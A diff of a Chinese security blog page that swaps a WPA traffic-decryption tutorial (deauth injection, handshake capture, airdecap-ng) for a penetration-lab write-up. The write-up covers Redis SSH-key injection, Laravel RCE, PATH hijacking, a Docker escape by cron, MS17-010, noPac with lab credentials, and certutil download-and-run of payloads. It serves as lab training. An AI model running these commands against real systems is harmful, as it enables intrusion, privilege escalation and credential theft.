@@ -6,30 +6,48 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://laohuan12138.github.io">
-  <title>WPA解密 | Laohuan&#39;s Blog</title>
+  <title>三层网络靶机打靶记录 | Laohuan&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="前言 此方法用于解密wifi下的802.11*数据包，可截获HTTP下的明文密码等其他信息，但HTTPS下的数据包仍无法解密，此方法成功必须满足以下两个条件。  先破解目标wifi密码或已经知道目标密码 抓取到握手包">
+  <meta name="description" content="简介本靶场由红日安全制作，涉及域和3层内网环境，并存在多个漏洞，可较好锻炼内网渗透能力。靶机环境及配置地址：ATT&amp;CK模拟攻击路径">
 <meta property="og:type" content="article">
-<meta property="og:title" content="WPA解密">
-<meta property="og:url" content="https://laohuan12138.github.io/2020/04/25/WPA%E8%A7%A3%E5%AF%86/index.html">
+<meta property="og:title" content="三层网络靶机打靶记录">
+<meta property="og:url" content="https://laohuan12138.github.io/2022/02/12/%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/index.html">
 <meta property="og:site_name" content="Laohuan&#39;s Blog">
-<meta property="og:description" content="前言 此方法用于解密wifi下的802.11*数据包，可截获HTTP下的明文密码等其他信息，但HTTPS下的数据包仍无法解密，此方法成功必须满足以下两个条件。  先破解目标wifi密码或已经知道目标密码 抓取到握手包">
+<meta property="og:description" content="简介本靶场由红日安全制作，涉及域和3层内网环境，并存在多个漏洞，可较好锻炼内网渗透能力。靶机环境及配置地址：ATT&amp;CK模拟攻击路径">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://cdn.laohuan.art/Snipaste_2019-09-26_19-38-20.png">
-<meta property="og:image" content="http://cdn.laohuan.art/Snipaste_2019-09-26_19-51-53-1024x342.png">
-<meta property="og:image" content="http://cdn.laohuan.art/Snipaste_2019-09-27_20-25-48.png">
-<meta property="og:image" content="http://cdn.laohuan.art/Snipaste_2019-09-27_20-27-21.png">
-<meta property="og:image" content="http://cdn.laohuan.art/Snipaste_2019-09-27_20-33-31.png">
-<meta property="og:image" content="http://cdn.laohuan.art/Snipaste_2019-09-27_20-36-47.png">
-<meta property="og:image" content="http://cdn.laohuan.art/Snipaste_2019-09-27_20-37-59.png">
-<meta property="og:image" content="http://cdn.laohuan.art/Snipaste_2019-09-27_20-41-24-1024x297.png">
-<meta property="og:image" content="http://cdn.laohuan.art/Snipaste_2019-09-27_20-44-41.png">
-<meta property="article:published_time" content="2020-04-25T11:06:01.000Z">
-<meta property="article:modified_time" content="2021-04-19T03:46:52.873Z">
+<meta property="og:image" content="https://image.3001.net/images/20210226/1614336174_6038d0ae97a56a0f1e287.png!small">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-01-30_12-47-54.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-01-30_14-54-51.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-01-30_14-54-37.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-01-30_15-57-06.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-01-30_16-41-55.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-01-31_11-43-20.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-01-30_17-08-30.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-01-30_17-49-48.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-01-30_18-24-42.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-01-30_18-38-23.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-01-30_20-31-37.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-01-30_20-44-51.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-02-03_11-48-16.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-02-03_11-58-25.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-02-03_14-42-12.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-02-03_14-46-58.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-02-04_11-36-41.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-02-04_12-20-15.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-02-05_13-30-26.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-02-05_12-09-57.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-02-04_13-21-29.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-02-05_12-49-20.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-02-05_12-51-22.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-02-05_15-00-07.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-02-05_15-03-52.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-02-05_15-45-03.png">
+<meta property="article:published_time" content="2022-02-12T06:01:27.000Z">
+<meta property="article:modified_time" content="2022-02-12T08:41:50.044Z">
 <meta property="article:author" content="Laohuan">
-<meta property="article:tag" content="Aircrack-ng套件">
+<meta property="article:tag" content="靶场">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://cdn.laohuan.art/Snipaste_2019-09-26_19-38-20.png">
+<meta name="twitter:image" content="https://image.3001.net/images/20210226/1614336174_6038d0ae97a56a0f1e287.png!small">
   
     <link rel="alternative" href="/atom.xml" title="Laohuan&#39;s Blog" type="application/atom+xml">
   
@@ -247,14 +265,14 @@
           </div>
           <div id="js-content" class="content-ll">
             
-<article id="post-WPA解密" class="article article-type-post " itemscope itemprop="blogPost">
+<article id="post-三层网络靶机打靶记录" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      WPA解密
+      三层网络靶机打靶记录
     </h1>
   
 
@@ -263,82 +281,143 @@
         
         
         
-<a href="/2020/04/25/WPA%E8%A7%A3%E5%AF%86/" class="archive-article-date">
-  	<time datetime="2020-04-25T11:06:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-25</time>
+<a href="/2022/02/12/%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" class="archive-article-date">
+  	<time datetime="2022-02-12T06:01:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-12</time>
 </a>
         
 		
 	
       </header>
 	  <div align="center" class="post-count">
-    字数：568字 | 预计阅读时长：2分钟
+    字数：1.5k字 | 预计阅读时长：6分钟
 </div>
 	  
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3><span id="前言">前言</span></h3><blockquote>
-<p>此方法用于解密wifi下的802.11*数据包，可截获HTTP下的明文密码等其他信息，但HTTPS下的数据包仍无法解密，此方法成功必须满足以下两个条件。</p>
-<ol>
-<li>先破解目标wifi密码或已经知道目标密码</li>
-<li>抓取到握手包</li>
-</ol>
-</blockquote>
+        <h3><span id="简介">简介</span></h3><p>本靶场由红日安全制作，涉及域和3层内网环境，并存在多个漏洞，可较好锻炼内网渗透能力。靶机环境及配置地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/9/" target="_blank" rel="noopener"><strong>ATT&amp;CK模拟攻击路径</strong></a></p>
 <a id="more"></a>
 
-<p>开启网卡监听模式</p>
-<p><code>airmon-ng start wlan0</code></p>
-<p>扫描附近热点</p>
-<p><code>airodump-ng wlan0mon</code></p>
-<p><img src="http://cdn.laohuan.art/Snipaste_2019-09-26_19-38-20.png" alt></p>
-<p>只抓取ESSID为test的数据包</p>
-<p><code>airodump-ng -c 12 --bssid B4:C4:FC:65:77:50 wlan0mon -w file.cap</code></p>
+<h3><span id="靶机信息">靶机信息</span></h3><p>1.靶机存在3层网络环境</p>
 <ul>
-<li>-c 指定信道</li>
-<li>–w 指定保存的文件名（可不加后缀.cap，会自动生成）</li>
+<li>192.168.x.x(DMZ区，桥接模式DHCP自动获取)</li>
+<li>192.168.52.1/24</li>
+<li>192.168.93.1/24</li>
 </ul>
-<p>使用 <kbd> Ctrl</kbd>+<kbd> c</kbd>  停止抓取,用wireshark打开数据包</p>
-<p><img src="http://cdn.laohuan.art/Snipaste_2019-09-26_19-51-53-1024x342.png" alt></p>
-<p>发现都是802.11加密得数据包</p>
-<h3><span id="解密数据包">解密数据包</span></h3><ol>
-<li>对test继续进行抓包</li>
-</ol>
-<p><code>airodump-ng -c 3 --bssid B4:C4:FC:65:77:50 wlan0mon -w test</code></p>
-<p>由于需要抓取握手包，我们发送deauth包让对方热点下的设备断开重连</p>
-<p><code>aireplay-ng  -0 15 -a B4:C4:FC:65:77:50 -c FC:64:BA:EB:78:B5 wlan0mon</code></p>
-<p><img src="http://cdn.laohuan.art/Snipaste_2019-09-27_20-25-48.png" alt></p>
+<p>2.可利用漏洞</p>
 <ul>
-<li>-0 指定deauth包的数量</li>
-<li>-a 指定bssid</li>
-<li>-c 指定客户端的mac地址（抓包时的STATION）</li>
+<li>漏洞搜索与利用</li>
+<li>Laravel Debug mode RCE（CVE-2021-3129）漏洞利用</li>
+<li>Docker逃逸</li>
+<li>通达OA v11.3 漏洞利用</li>
+<li>Linux环境变量提权</li>
+<li>Redis 未授权访问漏洞</li>
+<li>Linux sudo权限提升（CVE-2021-3156）漏洞利用</li>
+<li>SSH密钥利用</li>
+<li>Windows NetLogon 域内权限提升（CVE-2020-1472）漏洞利用</li>
+<li>MS14-068漏洞利用(未利用成功)</li>
 </ul>
-<ol start="2">
-<li>当出现红框内的 WPA handshake 表明抓取到握手包</li>
+<p><img src="https://image.3001.net/images/20210226/1614336174_6038d0ae97a56a0f1e287.png!small" alt="靶机截图"></p>
+<h3><span id="过程">过程</span></h3><h4><span id="1dmz-web服务器">1.DMZ web服务器</span></h4><p>NMAP全端口扫描发现开放22、80、81、6379端口</p>
+<p><code>nmap 192.168.0.106 -T4 -p-</code></p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-01-30_12-47-54.png" alt></p>
+<p>其中81端口为Laravel的站点，后面不知道什么原因导致站点访问不了，不浪费时间排查原因，转向6379端口，发现redis未授权访问。</p>
+<img src="https://cdn.laohuan.art/Snipaste_2022-01-30_14-54-51.png" style="zoom:67%;">
+
+<p>redis写入公钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">config <span class="built_in">set</span> dir /root/.ssh/</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line"><span class="built_in">set</span> sshpubkey <span class="string">"\n\n&#123;生成的公钥&#125;\n\n"</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>使用私钥连接web服务器</p>
+<p><code>ssh -i {私钥} 192.168.0.106</code></p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-01-30_14-54-37.png" alt></p>
+<p>反弹shell上线到msf,添加路由和socks代理</p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-01-30_15-57-06.png" alt></p>
+<p>使用fscan发现192.168.52.30为通达OA系统且存在永恒之蓝，192.168.52.20又有一个Laravel的站点。(使用代理+fscan扫不出来东西，将fscan上传至web服务器扫描)</p>
+<p><code>scp  -i /home/kali/test/test fscan_amd64  root@192.168.0.106:/root</code></p>
+<p><code>./fscan_amd64 -h 192.168.52.0/24</code></p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-01-30_16-41-55.png" alt></p>
+<p>同时发现代理服务器配置，原来这台服务器只是作为反向代理服务器使用，而真正的web服务是开启在192.168.52.20那台机器。</p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-01-31_11-43-20.png" alt></p>
+<h4><span id="2laravel站点">2.Laravel站点</span></h4><p>发现192.168.52.0段有两台机器，一台为通达OA,一台为真正的Laravel站点，我们先拿下Laravel的站点。</p>
+<p> Laravel是一套简洁、开源的PHP Web开发框架，旨在实现Web软件的MVC架构。当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar<a href="https://so.csdn.net/so/search?q=反序列化&spm=1001.2101.3001.7020" target="_blank" rel="noopener">反序列化</a>，最终造成远程代码执行。</p>
+<p>使用POC拿下shell，使用代理直接打经常导致连接中断，遂将POC传到DMZ的web服务器打(使用哥斯拉2.x版本，3.x版本无法连接)</p>
+<p><a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP" target="_blank" rel="noopener">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a></p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-01-30_17-08-30.png" alt></p>
+<p>成功连接</p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-01-30_17-49-48.png" alt></p>
+<p>发现权限较低，且多数命令不存在，检查发现为docker环境</p>
+<p><code>cat /proc/1/cgroup</code></p>
+<p><code>ls -lh / .dockerenv</code></p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-01-30_18-24-42.png" alt></p>
+<p>准备看看能不能docker逃逸，但逃逸之前得先把权限提到root</p>
+<p>使用提权脚本检查一下，<a href="https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh" target="_blank" rel="noopener">https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh</a>,连续尝试了好几个都失败。</p>
+<p><code>./linux-exploit-suggester.sh</code></p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-01-30_18-38-23.png" alt></p>
+<p>使用suid提权，搜索设置了suid位的文件,发现jobs目录下有个shell文件</p>
+<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-01-30_20-31-37.png" alt></p>
+<p>发现这个shell文件实则是运行了ps命令，可通过修改环境变量，让其执行我们恶意的ps文件来拿到root权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br></pre></td></tr></table></figure>
+
+<p>回到jobs目录，执行shell文件，获得root权限</p>
+<p><code>./shell</code></p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-01-30_20-44-51.png" alt></p>
+<p>python伪终端</p>
+<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p>随后使用CDK进行docker逃逸，试了几个逃逸漏洞都没圆满逃逸成功，工具地址:<a href="https://github.com/cdk-team/CDK/wiki/CDK-Home-CN" target="_blank" rel="noopener">CDK</a></p>
+<p>随后使用docker特权模式逃逸成功</p>
+<p>先在容器内新建一个test目录，然后将宿主机的磁盘挂载到容器的test目录</p>
+<p><code>mkdir /test</code></p>
+<p>`mount /dev/sda1 /test</p>
+<p>使用msf生成linux的正向shell的可执行程序，通过docker上传到宿主机，并通过写入计划任务让宿主机执行我们的恶意程序。</p>
+<p>这里遇到一个坑，写入计划后就是不执行，将其权限设置为600才执行成功</p>
+<p><code>echo &#39;* * * * * cd /home/ubuntu &amp;&amp; ./bind_4455.elf&#39; &gt;&gt; /test/var/spool/cron/crontabs/root</code></p>
+<p><code>chmod 600 root</code></p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-02-03_11-48-16.png" alt></p>
+<p>成功拿下Laravel站点</p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-02-03_11-58-25.png" alt></p>
+<h4><span id="3通达oa">3.通达OA</span></h4><p>192.168.52.0/24还有一个通达OA系统，192.168.52.30</p>
+<p>浏览器添加socks代理，查看OA版本,此版本存在多个漏洞</p>
+<p><code>http://192.168.52.30:8080/inc/expired.php</code></p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-02-03_14-42-12.png" alt></p>
+<p>直接使用exp获得shell</p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-02-03_14-46-58.png" alt></p>
+<p>使用msf生成正向shell可执行程序，上传到dmz的web服务器，并开启简单的http服务</p>
+<p><code>python3 -m http.server 8082</code></p>
+<p><code>certutil -urlcache -split -f http://192.168.52.10:8082/bind_53.exe &amp;&amp; bind_53.exe</code></p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-02-04_11-36-41.png" alt></p>
+<p>成功拿下OA服务器</p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-02-04_12-20-15.png" alt></p>
+<p>发现存在192.168.93.0/24段，添加路由并抓取密码</p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-02-05_13-30-26.png" alt></p>
+<h4><span id="4win7">4.win7</span></h4><p>扫描发现192.168.93.0/24存在2台机器，且192.168.93.30为域控，192.168.93.40存在永恒之蓝。</p>
+<p><code>net time /domain</code></p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-02-05_12-09-57.png" alt></p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-02-04_13-21-29.png" alt></p>
+<p>使用ms17-010拿下win7</p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-02-05_12-49-20.png" alt></p>
+<p>抓取密码</p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-02-05_12-51-22.png" alt></p>
+<h4><span id="5域控">5.域控</span></h4><p>前期发现192.168.93.30为域控制器，且存在ms17-010，但无法成功，猜测由于使用的是msf正向shell，域控防火墙处于开启状态导致获取shell失败。</p>
+<p>遂使用ms14-068漏洞也利用失败</p>
+<p>前期已获取到域账户密码，使用CVE-2021-42287 &amp; CVE-2021-42278成功获取域控权限</p>
+<p>扫描是否存在漏洞</p>
+<p><code>proxychains3 python3 scanner.py whoamianony.org/bunny:Bunny2021 -dc-ip 192.168.93.30 -use-ldap</code></p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-02-05_15-00-07.png" alt></p>
+<p>存在漏洞，直接获取权限</p>
+<p><code>proxychains3 python3 noPac.py whoamianony.org/bunny:Bunny2021 -dc-ip 192.168.93.30 -dc-host dc -shell --impersonate administrator -use-ldap</code></p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-02-05_15-03-52.png" alt></p>
+<p>使用msf生成正向shell可执行程序，将其上传到内网web服务器，并关闭域控防护墙</p>
+<p><code>netsh advfirewall set allprofiles state off</code></p>
+<p>从web服务器下载恶意程序并运行</p>
+<p><code>certutil -urlcache -split -f http://192.168.93.20:8080/dc_7777.exe &amp;&amp; dc_7777.exe</code></p>
+<p>成功拿下域控</p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-02-05_15-45-03.png" alt></p>
+<h3><span id="参考链接">参考链接</span></h3><ol>
+<li><a href="https://www.freebuf.com/articles/network/264560.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/264560.html</a></li>
+<li><a href="https://www.zyl.fit/archives/linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E4%B8%8D%E6%89%A7%E8%A1%8C" target="_blank" rel="noopener">https://www.zyl.fit/archives/linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E4%B8%8D%E6%89%A7%E8%A1%8C</a></li>
+<li><a href="https://blog.csdn.net/weixin_48300170/article/details/118890732" target="_blank" rel="noopener">https://blog.csdn.net/weixin_48300170/article/details/118890732</a></li>
 </ol>
-<p><img src="http://cdn.laohuan.art/Snipaste_2019-09-27_20-27-21.png" alt></p>
-<p>数分钟后，<kbd>ctrl</kbd>+<kbd>c</kbd>停止抓包</p>
-<p>在当前目录下生成一个test-01.cap的文件</p>
-<p><img src="http://cdn.laohuan.art/Snipaste_2019-09-27_20-33-31.png" alt></p>
-<ol start="3">
-<li>解密这个数据包文件</li>
-</ol>
-<p><code>airdecap-ng -e test -b B4:C4:FC:65:77:50 -p 88888888 test-01.cap</code></p>
-<ul>
-<li>参数 -e 指定essid(wifi名字)</li>
-<li>-b 指定bssid</li>
-<li>-p 指定wifi密码</li>
-</ul>
-<p><img src="http://cdn.laohuan.art/Snipaste_2019-09-27_20-36-47.png" alt></p>
-<p>红框内即为解密WPA包的数量</p>
-<p>接下来会在当前目录生成一个已解密的dec.cap文件</p>
-<p><img src="http://cdn.laohuan.art/Snipaste_2019-09-27_20-37-59.png" alt></p>
-<ol start="4">
-<li>用wireshark打开此数据包，已经可以看到具体协议的数据包，起初这些数据包是被802.11协议加密的</li>
-</ol>
-<p><img src="http://cdn.laohuan.art/Snipaste_2019-09-27_20-41-24-1024x297.png" alt></p>
-<p>如果有明文传送的账号密码，在TCP流里很容易找到</p>
-<p><img src="http://cdn.laohuan.art/Snipaste_2019-09-27_20-44-41.png" alt></p>
-<h3><span id="后话">后话</span></h3><p>当知道或已经破解了对方的wifi密码，可连接此wifi热点后再进行抓包，这时抓到的数据包就已经是解密的了（802.11协议的解密），不必再向本文如此大动干戈。当对方热点主人设置了指点mac地址的设备才可以连接wifi时，你知道对方密码也连接不上wifi时，便可参考此方法。</p>
 
       
 
@@ -382,7 +461,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Aircrack-ng套件</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">靶场</a>
         		</li>
       		
 		</ul>
@@ -394,7 +473,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/无线渗透//" class="article-tag-list-link color5">无线渗透</a>
+        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
         		</li>
       		
 		</ul>
@@ -449,7 +528,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://laohuan12138.github.io/2020/04/25/WPA%E8%A7%A3%E5%AF%86/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://laohuan12138.github.io/2022/02/12/%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -463,15 +542,11 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/04/27/%C2%96wIDS%E6%97%A0%E7%BA%BF%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          wIDS无线入侵检测
-        
-      </div>
-    </a>
   
+    <a href="/2021/12/24/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">渗透攻击红队靶场</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
@@ -496,7 +571,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">2.</span> <span class="toc-text">解密数据包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">3.</span> <span class="toc-text">后话</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">2.</span> <span class="toc-text">靶机信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">3.</span> <span class="toc-text">过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#"><span class="toc-number">3.1.</span> <span class="toc-text">1.DMZ web服务器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#"><span class="toc-number">3.2.</span> <span class="toc-text">2.Laravel站点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#"><span class="toc-number">3.3.</span> <span class="toc-text">3.通达OA</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#"><span class="toc-number">3.4.</span> <span class="toc-text">4.win7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#"><span class="toc-number">3.5.</span> <span class="toc-text">5.域控</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -512,7 +587,7 @@
   
 
   
-  <div id="SOHUCS" sid="WPA解密" ></div> 
+  <div id="SOHUCS" sid="三层网络靶机打靶记录" ></div> 
 <script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
 <script type="text/javascript">
     window.changyan.api.config({
